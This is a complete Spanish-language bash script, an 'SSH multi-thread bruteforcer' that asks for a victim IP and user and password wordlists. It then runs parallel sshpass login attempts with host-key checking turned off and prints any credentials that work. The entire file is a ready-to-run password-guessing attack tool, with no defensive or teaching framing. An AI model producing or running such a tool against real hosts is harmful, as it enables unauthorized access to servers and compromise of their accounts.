#!/bin/bash

# --- REQUISITOS ---
if ! command -v sshpass &> /dev/null; then
    echo "[-] Error: 'sshpass' no está instalado. Ejecuta: sudo apt install sshpass"
    exit 1
fi

# --- INTERFAZ ---
echo "=================================================="
echo "      SSH MULTI-THREAD BRUTEFORCER v3.0"
echo "=================================================="

read -p "[?] IP de la víctima: " TARGET
read -p "[?] ¿Usar lista de usuarios? (s/n): " MULTI_USER

if [[ "$MULTI_USER" =~ ^[Ss]$ ]]; then
    read -p "[?] Ruta del diccionario de USUARIOS: " USER_LIST
    if [[ ! -f "$USER_LIST" ]]; then echo "[-] Error: Archivo no encontrado."; exit 1; fi
else
    read -p "[?] Nombre del usuario: " SINGLE_USER
fi

read -p "[?] Ruta del diccionario de PASSWORDS: " PASS_LIST
if [[ ! -f "$PASS_LIST" ]]; then echo "[-] Error: Archivo no encontrado."; exit 1; fi

read -p "[?] Número de hilos (5-15): " MAX_THREADS

echo -e "\n[*] Iniciando ataque... (Presiona Ctrl+C para abortar)"
echo "--------------------------------------------------"

# --- LÓGICA DE ATAQUE ---
probar_acceso() {
    local u="$1"
    local p="$2"
    
    echo -ne " -> Probando: $u : $p\033[K\r"

    if sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -o BatchMode=yes "$u@$TARGET" "whoami" &>/dev/null; then
        echo -e "\n\n\033[1;32m=========================================="
        echo "      ¡ACCESO ENCONTRADO!"
        echo "=========================================="
        echo "  USUARIO:    $u"
        echo "  CONTRASEÑA: $p"
        echo "  IP DESTINO: $TARGET"
        echo -e "==========================================\033[0m"
        
        # Mata el grupo de procesos para detener todos los hilos
        kill 0
    fi
}

export -f probar_acceso
export TARGET

# --- GESTIÓN DE USUARIOS Y PASSWORDS ---
ejecutar_ataque() {
    local users=$1
    local passwords=$2

    for u in $users; do
        while read -r p; do
            # Control de hilos
            while [ $(jobs -rp | wc -l) -ge $MAX_THREADS ]; do
                sleep 0.05
            done
            
            probar_acceso "$u" "$p" &
        done < "$passwords"
    done
}

# Determinar si atacamos uno o varios usuarios
if [[ "$MULTI_USER" =~ ^[Ss]$ ]]; then
    ejecutar_ataque "$(cat $USER_LIST)" "$PASS_LIST"
else
    ejecutar_ataque "$SINGLE_USER" "$PASS_LIST"
fi

wait
echo -e "\n[!] Proceso finalizado sin más resultados."
